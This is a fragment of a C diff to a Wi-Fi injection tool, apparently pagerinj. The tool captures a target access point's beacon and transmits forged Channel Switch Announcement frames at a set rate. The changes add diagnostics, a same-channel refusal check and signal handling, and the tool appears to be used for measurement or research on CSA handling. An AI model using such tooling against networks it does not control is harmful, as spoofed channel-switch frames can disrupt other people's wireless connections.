+        fprintf(stderr, "waiting up to %ds for a clean beacon from %02x:%02x:%02x:%02x:%02x:%02x on %s ...\n",
+                wait_s, bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5], ifname);
+        size_t clen = capture_beacon(fd, bssid, wait_s, cap, sizeof cap, &skipped, &rx_err);
         if (!clen) {
-            fprintf(stderr, "no beacon captured — is the interface on the target's channel?\n");
+            if (rx_err)
+                fprintf(stderr, "recv: %s\n", strerror(rx_err));
+            else if (skipped > 0)
+                fprintf(stderr, "no clean beacon captured: skipped %d beacon(s) from this BSSID that "
+                                "already carried a CSA (37) or eCSA (60) element.  A running pineapd "
+                                "CSA flood or an earlier pagerinj run is the likely source -- stop it "
+                                "(/etc/init.d/pineapd stop) and retry.\n", skipped);
+            else
+                fprintf(stderr, "no beacon captured — is the interface on the target's channel?\n");
             close(fd); return 1;
+        }
+        if (skipped > 0)
+            fprintf(stderr, "note: skipped %d CSA-bearing beacon(s) from this BSSID before a clean one "
+                            "arrived -- something else is announcing a switch for it\n", skipped);
+        if (same_chan_refused(cap, clen, chan, allow_same)) {
+            fprintf(stderr, "refusing to transmit: --chan %d is the channel this beacon's DS Parameter "
+                            "Set says the BSS is already on.  A same-channel CSA announces no move "
+                            "(and with --mode 0 csa_present() discards it outright, mlme.c:8351).  "
+                            "Pick a different --chan, or pass --allow-same-chan if that is what you "
+                            "mean to measure.\n", chan);
+            close(fd); return 2;
         }
         flen = csa_frame_build(cap, clen, (uint8_t)mode, (uint8_t)chan, (uint8_t)count,
                                ecsa_count, (uint8_t)(ecsa_opclass < 0 ? 0 : ecsa_opclass),
@@ -840,11 +1136,21 @@ int main(int argc, char **argv)
                     clen, mode, chan, count, flen);
     }
 
+    if (phy_rate)
+        fprintf(stderr, "radiotap: RATE field %d Mbps (%d x 500 kbps), it_len %zu\n",
+                phy_rate, phy_rate * 2, RTAP_TX_LEN);
+
     /* Transmit.  Nothing here touches the channel — see the file header. */
+    struct sigaction sa;
+    memset(&sa, 0, sizeof sa);
+    sa.sa_handler = on_stop;
+    sigaction(SIGINT, &sa, NULL);
+    sigaction(SIGTERM, &sa, NULL);
+
     long sent = 0, failed = 0;
     time_t end = secs > 0 ? time(NULL) + secs : 0;
     long interval_ns = 1000000000L / rate;
-    for (;;) {
+    while (!stop_flag) {
         if (end && time(NULL) >= end) break;
         if (tx(fd, ifindex, frame, flen) < 0) {
             if (failed == 0) perror("sendto");
@@ -858,8 +1164,9 @@ int main(int argc, char **argv)
 
     /* sendto() reporting success proves nothing: a cfg80211-blocked frame is freed and the path
      * returns NETDEV_TX_OK.  Only the external receiver can tell you it was transmitted. */
-    fprintf(stderr, "sent=%ld failed=%ld  (sendto success does NOT mean transmitted — "
-                    "confirm at the external receiver)\n", sent, failed);
+    fprintf(stderr, "%ssent=%ld failed=%ld  (sendto success does NOT mean transmitted — "
+                    "confirm at the external receiver)\n",
+            stop_flag ? "interrupted: " : "", sent, failed);
     close(fd);
     return failed && !sent ? 1 : 0;
 }
